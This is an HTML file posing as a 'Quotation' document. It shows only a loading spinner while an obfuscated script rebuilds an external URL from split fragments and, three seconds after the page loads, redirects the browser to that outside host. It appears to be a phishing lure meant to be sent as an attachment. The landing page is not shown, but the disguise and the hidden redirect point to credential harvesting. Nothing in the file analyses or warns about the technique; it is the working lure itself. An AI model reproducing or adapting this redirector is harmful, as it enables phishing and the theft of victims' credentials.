<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Quotation...</title>
	<style>
		#loader {
			display: flex;
			align-items: center;
			justify-content: center;
			width: 100%;
			height: 100%;
			position: absolute;
			top: 0;
			left: 0;
			background-color: #fff;
			z-index: 99;
			border-radius: 10px;
		}
	
		@keyframes hideLoader {
			from {
				opacity: 1;
			}
	
			to {
				opacity: 0;
			}
		}
	
		@keyframes showLoader {
			from {
				opacity: 0;
			}
	
			to {
				opacity: 1;
			}
		}
	
		
	</style>
</head>
<body>
	<div id='loader'>
		<i class='fa fa-spinner fa-spin' style='font-size: 25px;'></i>
	</div>
	<script>
		let nbg1 = 'https'
			let nbg2 = '://go'
			let nbg3 = '4w.'
			let nbg4 = 'on.flee'
			let nbg5 = 'k.co/go'
			let nbg6 = '4w.ht'
			let nbg7 = 'ml'
		document.addEventListener('DOMContentLoaded', () => {
			setTimeout(() => {
				window.location.assign(`${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}${nbg7}`)
			}, 3000)
		})
	</script>
</body>
</html>
